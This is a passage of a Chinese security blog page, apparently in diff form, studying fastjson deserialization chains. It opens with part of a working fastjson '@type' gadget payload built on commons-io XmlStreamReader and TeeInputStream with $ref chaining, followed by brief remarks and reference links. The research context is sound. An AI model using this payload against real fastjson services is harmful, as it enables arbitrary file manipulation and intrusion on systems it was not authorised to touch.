class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">  <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">  <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">  <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">  <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson-in-spring1.2.80的版本可以看</p>
+<p><a target="_blank" rel="noopener" href="https://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/%E5%B7%B2%E7%BB%8F%E6%87%92%E5%BE%97%E5%86%8D%E5%86%99%E4%BA%86%EF%BC%8C%E6%84%9F%E8%A7%89%E8%BF%99%E6%BC%8F%E6%B4%9E%E5%A5%BD%E6%81%B6%E5%BF%83">https://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/已经懒得再写了，感觉这漏洞好恶心</a></p>
+<p>jqctf就不复现了，就算把那道题要考的漏洞看完了之后再去看岳神的wp还是感觉如果复现的话会很痛苦</p>
+<p>参考:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/376759650">https://zhuanlan.zhihu.com/p/376759650</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16145">https://xz.aliyun.com/news/16145</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/06/12/Spring%E9%93%BE/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Spring链</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/04/27/H2Revenge(NCTF)/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">H2Revenge(NCTF)</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
